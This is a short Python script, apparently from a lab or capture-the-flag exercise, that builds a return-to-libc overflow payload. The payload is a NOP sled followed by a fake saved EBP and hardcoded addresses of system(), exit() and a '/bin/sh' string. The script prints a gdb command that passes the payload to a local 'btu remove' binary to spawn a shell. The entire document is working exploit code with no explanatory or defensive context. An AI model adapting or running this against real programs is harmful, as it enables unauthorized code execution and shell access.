#!/usr/bin/python3

content = bytearray(0x90 for i in range(48))  # NOP sled

# Fake saved EBP
fake_ebp = 0xffffcdb8
content += fake_ebp.to_bytes(4, byteorder='little')

# system()
system_addr = 0xf7b0f220
content += system_addr.to_bytes(4, byteorder='little')

# exit()
exit_addr = 0xf7afbad0
content += exit_addr.to_bytes(4, byteorder='little')

# "/bin/sh" (skip "SHELL=" → address of "dead" string offset)
binsh_addr = 0xffffdead
content += binsh_addr.to_bytes(4, byteorder='little')

# Generate escaped format
escaped = ''.join('\\x{:02x}'.format(b) for b in content)
print(f'gdb --args ./build/bin/btu remove 1025 $(echo -e "{escaped}")')

